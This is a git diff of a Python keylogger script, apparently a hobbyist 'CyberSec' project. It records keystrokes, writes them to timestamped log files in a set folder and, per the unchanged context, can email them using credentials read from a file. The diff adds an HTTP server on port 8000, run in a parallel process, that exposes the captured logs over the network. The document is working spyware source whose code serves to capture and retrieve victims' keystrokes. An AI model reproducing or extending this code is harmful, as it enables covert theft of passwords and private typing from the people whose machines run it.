@@ -4,8 +4,15 @@ from threading import Timer
 from datetime import datetime
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
+import multiprocessing
+import http.server 
+import socketserver
+import os.path 
 
-SEND_REPORT_EVERY = 60
+SEND_REPORT_EVERY = 300
+SAVE_PATH = "D:\Code\CyberSec\KeyLogger\logs" #replace this with the path you want to save log files into 
+PORT = 8000
+Handler = http.server.SimpleHTTPRequestHandler
 
 
 class Keylogger:
@@ -34,7 +41,7 @@ class Keylogger:
     def update_filename(self):
         start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
         end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
-        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
+        self.filename = os.path.join(SAVE_PATH,f"keylog-{start_dt_str}_{end_dt_str}")
 
     def report_to_file(self):
         with open(f"{self.filename}.txt", "w") as f:
@@ -63,12 +70,15 @@ class Keylogger:
             print(f"{datetime.now()} - Sent an email to {email} containing:  {message}")
 
     def report(self):
+
+
         creds = open("creds.txt", "r")
         content = creds.readlines()
         global EMAIL_ADDRESS
         global PASSWORD
         EMAIL_ADDRESS = content[0]
         PASSWORD = content[1]
+
         if self.log:
             self.end_dt = datetime.now()
             self.update_filename()
@@ -79,6 +89,7 @@ class Keylogger:
                 print(f"[{self.filename}] - {self.log}")
             self.start_dt = datetime.now()
         self.log = ""
+
         timer = Timer(interval=self.interval, function=self.report)
         timer.daemon = True
         timer.start()
@@ -90,7 +101,18 @@ class Keylogger:
         print(f"{datetime.now()} - Started keylogger")
         keyboard.wait()
 
+    def start_server(self):
+        with socketserver.TCPServer(("", PORT), Handler) as httpd:
+                    print("Serving on port", PORT)
+                    httpd.serve_forever()
+
     
 if __name__ == "__main__":
     keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
-    keylogger.start()
+    p1 = multiprocessing.Process(target=keylogger.start)
+    p2 = multiprocessing.Process(target=keylogger.start_server)
+
+    p1.start()
+    p2.start()
+
+
